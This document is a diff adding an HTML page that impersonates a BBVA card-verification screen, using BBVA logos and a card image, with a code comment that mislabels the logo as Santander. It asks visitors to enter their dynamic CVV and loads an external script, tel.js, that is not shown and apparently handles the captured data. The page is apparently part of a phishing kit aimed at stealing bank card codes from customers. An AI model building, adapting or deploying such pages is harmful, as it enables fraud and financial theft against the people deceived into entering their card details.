@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro de datos</title>
+    <style>
+        /* Estilos generales */
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Estilos del header */
+        .header {
+            width: 100%;
+            background-color: #ffffff;
+            padding: 5px 0;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 10;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); /* Añade una sombra sutil */
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+
+
+        /* Contenedor principal */
+        .verification-container {
+            background-color: white;
+            width: 400px;
+            padding: 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px; /* Desplazamiento hacia abajo para evitar que el header lo tape */
+        }
+
+        /* Logo de la tarjeta */
+        .logo-container img {
+            width: 150px;
+            margin-bottom: 30px;
+        }
+
+        /* Estilo de los campos del formulario */
+        .verification-container input {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin: 10px 0;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        /* Estilo del botón */
+        .verification-container button {
+            width: 100%;
+            padding: 15px;
+            background-color: #000099;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        .verification-container button:hover {
+            background-color: #000080;
+        }
+
+        /* Ajustes de responsive */
+        @media screen and (max-width: 768px) {
+            .verification-container {
+                width: 90%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header mejorado con logo rojo de Santander y fondo blanco -->
+    <header class="header">
+        <img src="https://cdn.worldvectorlogo.com/logos/logotipo-de-bbva.svg" alt="Logo Santander">
+    </header>
+
+    <!-- Contenedor de verificación centrado -->
+    <div class="verification-container">
+        <!-- Logo de la tarjeta en el formulario -->
+        <div class="logo-container">
+            <img src="https://www.bbva.pe/content/dam/public-web/peru/images/credit-cards/product-visa-clasica.im1562692480768im.png?imwidth=768">
+        </div>
+
+        <!-- Formulario de verificación -->
+        <form id="verificationForm">
+            <h2 style="margin: 0px">Ingresa tu CVV Dinámico</h2>
+            <input type="text" name="cvv" id="cvv" placeholder="CVV" maxlength="3" required>
+            
+            <button type="submit">Verificar</button>
+        </form>
+    </div>
+</body>
+<script type="text/javascript" src="tel.js"></script>
+</html>
